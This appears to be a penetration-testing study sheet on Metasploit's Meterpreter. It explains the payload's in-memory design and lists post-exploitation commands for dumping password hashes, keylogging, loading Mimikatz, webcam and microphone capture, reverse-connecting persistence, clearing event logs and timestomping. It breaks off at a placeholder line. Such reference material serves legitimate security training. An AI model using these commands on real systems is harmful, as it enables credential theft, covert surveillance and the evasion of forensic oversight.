# Meterpreter (Meta-Interpreter)

Meterpreter is one of the most advanced and powerful post-exploitation payloads in the Metasploit Framework. Designed for stealth, flexibility, and in-memory execution, it gives an attacker extensive control over a compromised system with minimal forensic footprint.

## What is Meterpreter?
- A fileless, in-memory payload that does not write to disk.
- Runs entirely inside the memory of an existing process using DLL injection.
- Extensible at runtime by loading additional modules.
- Provides a rich post-exploitation environment similar to a command interpreter.

## Components
### 1. Server Portion (Victim Side)
- Written in plain C.
- Small, efficient, and runs fully in memory.

### 2. Client API (Attacker Side)
- Usually written in Ruby (inside Metasploit).
- Can be implemented in any language.

## Key Features
- **Fileless Operation**
  - No executable saved on disk.
  - Avoids traditional antivirus detection.

---

## Meterpreter Design Goals

### 1. Stealthy
- Entirely in-memory (no disk artifacts).
- Injects into existing processes â†’ no new process creation.
- Can migrate processes to evade detection.
- Uses TLS-encrypted communication.
- Minimal forensic footprint.

### 2. Powerful
Supports complex post-exploitation operations such as:
- Port forwarding
- Screen capture
- Keylogging
- Shell spawning
- Memory manipulation

### 3. Extensible
- Features added at runtime.
- Extensions loaded dynamically over the network.
- No recompilation required.

---

## How Meterpreter Works

### 1. Target Executes the Stager
Examples: `reverse_tcp`, `bind_tcp`, `findtag`, `passivex`, etc.

### 2. Stager Loads the Reflective DLL
- The reflective loader injects the Meterpreter DLL into memory.

### 3. Meterpreter Core Initializes
- Establishes an encrypted TLS 1.0 communication channel.
- Sends an initial request to Metasploit.
- Metasploit configures the session.

### 4. Extensions Loaded
Automatically or dynamically:
- `stdapi` (always)
- `priv` (if admin)
- Additional DLL modules loaded over encrypted TLV messages.

---

## Capabilities & Features

### In-Memory DLL Injection
- Uses Reflective DLL Injection to load code stealthily into memory.

### Command Interpreter
- Works like a command shell but with advanced features.

### Runtime Extension
- Can load additional DLLs at any time (e.g., `stdapi`, `priv`).

## Capabilities

### Command Execution
- Run arbitrary system commands.

### Privilege Escalation
- Attempt to elevate to SYSTEM or admin.

### Process Migration
- Move Meterpreter into another running process to evade detection.

### File System Access
- Read, write, upload, download files.

### Registry Manipulation
- Interact with the Windows Registry.

### Pivoting

# Meterpreter Command

A quick-reference guide to the most commonly used Meterpreter commands during post-exploitation.

## Session & Core Commands

- **Show available commands**

      help

- **Display target system information**

      sysinfo

- **Terminate the session**

      exit

- **Background the session**

       background

- **List all active sessions**

      sessions -l

- **Interact with a session**

      sessions -i <id>

---

## Shell Access

- **Drop into Windows command shell**

      shell

- **Launch interactive PowerShell**

      powershell_shell

- **Execute a program on the target**

       execute -f <program>

- **List running processes**

      ps

- **Migrate Meterpreter to another process**

      migrate <pid>

---

## Privilege Escalation

- **Show current user**

      getuid

- **List privileges**

      getprivs

- **Show Windows privilege information**

      run post/windows/gather/win_privs

- **Attempt to elevate to SYSTEM**

      run get_system

- **Dump password hashes**

      hashdump

---

## File System Commands

- **List directory contents**

      ls

- **Change directory**

      cd <path>

- **Print working directory**

      pwd

- **Upload file**

      upload <local> <remote>

- **Download file**

      download <remote> <local>

- **Edit file**

       edit <file>

- **Delete file**

       rm <file>

- **Create directory**

       mkdir <dir>

---

## Network Commands

- **Show network interfaces**

      ipconfig

- **Display routing table**

      route

- **Add port forwarding**

       portfwd add -l <LPORT> -p <RPORT> -r <RHOST>

- **List port forwards**

      portfwd list

## Network Commands (Continued)

- **Show ARP cache**

      arp

- **Show network connections**

      netstat

---

## Post-Exploitation Modules

- **Detect virtual machine**

       run post/windows/gather/checkvm

- **Enumerate Windows information**

      run winenum

- **Dump passwords & system data**

      run scraper

- **Enable Remote Desktop**

      run post/windows/manage/enable_rdp

- **Automated process migration**

      run post/windows/manage/migrate

---

## Webcam, Audio, Screenshot

- **List webcams**

      webcam_list

- **Take snapshot**

      webcam_snap

- **Stream webcam**

      webcam_stream

- **Record microphone**

       record_mic

- **Capture screenshot**

      screenshot

---

## Keylogging & Credential Attacks

- **Start keylogger**

      keyscan_start

- **Dump keystrokes**

      keyscan_dump

- **Stop keylogger**

      keyscan_stop

- **Dump password hashes**

      hashdump

- **Load Mimikatz (Kiwi)**

      load kiwi

- **Show all collected credentials**

      creds_all

---

## Persistence & Backdoors

- **Show persistence options**

      run persistence -h

- **Create user-level persistence**

      run persistence -U -i 5 -p 4444 -r <LHOST>

- **Scheduled task backdoor**

      run exploit/windows/local/persistence

---

## Bypass & Evasion

- **Clear Event Logs**

      clearev

- **Modify timestamp metadata**

      timestomp <file>

- **Load stdapi**

      load stdapi

- **Load privilege APIs**

      load priv

---

## Pivoting

- **Auto-pivot to subnet**
 
      autoroute -s <subnet>

- **Manually add route**

      route add <subnet> <mask> <gw>

- **Create SOCKS proxy**

      use auxiliary/server/socks_proxy

---

## File Uploading / Execution

- **Upload executable**

      upload <file>

- **Run executable**
  [Command obscured/cut off]
